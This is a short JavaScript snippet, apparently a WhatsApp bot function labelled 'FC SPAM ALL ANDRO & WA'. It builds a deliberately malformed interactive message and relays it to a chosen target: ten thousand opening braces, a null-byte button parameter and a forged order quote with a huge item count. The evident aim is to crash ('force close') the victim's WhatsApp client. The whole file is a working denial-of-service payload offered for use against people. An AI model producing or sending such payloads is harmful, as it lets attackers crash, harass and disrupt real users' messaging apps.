// FC SPAM ALL ANDRO & WA

async function xforce(target, Ptcp = true) {
  let MsgPay = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
	  message: {
		interactiveMessage: {
		  header: {
			title: "",
		    hasMediaAttachment: false
		  },
		  body: {
			text: '....'
		  },
		  nativeFlowMessage: {
		    messageParamsJson: "{".repeat(10000), 
			buttons: [
			  {
			    name: 'single_select', 
			    buttonParamsJson: '\u0000'
			  }, 
			  {
			    name: 'call_permission_request', 
			    buttonParamsJson: "{}"
			  }
			]
		  },
		}
	  }
	}
  }), {
    userJid: target,
    quoted: {
	  key: {
	    participant: "0@s.whatsapp.net",
	    remoteJid: "status@broadcast"
	  },
 	  message: {
		orderMessage: {
		  itemCount: 999999999,
		  status: 1,
		  surface: 2,
		  orderTitle: ".....",
		  sellerJid: "0@s.whatsapp.net"
		}
	  }
	}
  });
  
  await sock.relayMessage(target, Msgpay.message, Ptcp ? {
	participant: {
	  jid: target
	}
  } : {});
  console.log(chalk.red("Send Bug By amelia"));
}